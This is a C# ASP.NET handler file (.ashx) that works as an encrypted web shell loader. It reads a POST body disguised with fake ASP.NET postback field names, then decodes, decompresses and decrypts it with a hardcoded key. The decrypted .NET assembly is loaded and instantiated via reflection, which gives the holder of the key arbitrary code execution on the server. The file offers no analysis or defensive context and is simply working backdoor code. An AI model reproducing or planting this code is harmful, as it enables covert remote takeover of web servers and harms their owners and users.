<% @ webhandler language="C#" class="ElbisHandler" %>

using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Web;

public class ElbisHandler : IHttpHandler
{
  /* .Net requires this to be implemented */
  public bool IsReusable
  {
    get { return true; }
  }

  /* main executing code */
  public void ProcessRequest(HttpContext ctx)
  {  

	if (ctx.Request.HttpMethod == "POST")
            {
                // Gelen veriyi okumak için bir StreamReader kullanıyoruz
                using (var reader = new StreamReader(ctx.Request.InputStream))
                {
                    // Post body'sini okuyup bir string'e atıyoruz
                    	string request = reader.ReadToEnd(); 
 			byte[] array2 = null;
 			string text = "";
			request = HttpUtility.UrlDecode(request);
			request = request.Replace("__NOTIFICATIONID=", "").Replace("__CALLBACKPARAMETER=", "").Replace("__ACTIONARGUMENT=", "").Replace("__ACTIONTARGET=", "").Replace("__VALIDATIONRESULT=", "").Replace("__SECURITYTOKEN=", "").Replace("&", "").Replace(" ", "+");
			byte[] encryptedData = Convert.FromBase64String(request);
        		byte[] key = new Guid("6979696b-6976-6172-7369-6e206572656e").ToByteArray();
        		byte[] decryptedData;
        		using (MemoryStream compressedStream = new MemoryStream(encryptedData))
        		{
           			using (MemoryStream decompressedStream = new MemoryStream())
            			{
			                using (GZipStream gzipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
			                {
			                    gzipStream.CopyTo(decompressedStream);
			                }
			                byte[] encryptedBytes = decompressedStream.ToArray();
			                using (MemoryStream memoryStream = new MemoryStream(encryptedBytes))
 			                {
			                    using (MemoryStream decryptedStream = new MemoryStream())
			                    {
			                        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, new RijndaelManaged { Mode = CipherMode.CBC }.CreateDecryptor(key, key), CryptoStreamMode.Read))
			                        {
			                            cryptoStream.CopyTo(decryptedStream);
			                        }
						decryptedData = decryptedStream.ToArray();
						Assembly.Load(decryptedData).CreateInstance("N.C").Equals("");
                    			    }
               			        }
            			}
       			}
		}	
	    }

 }
}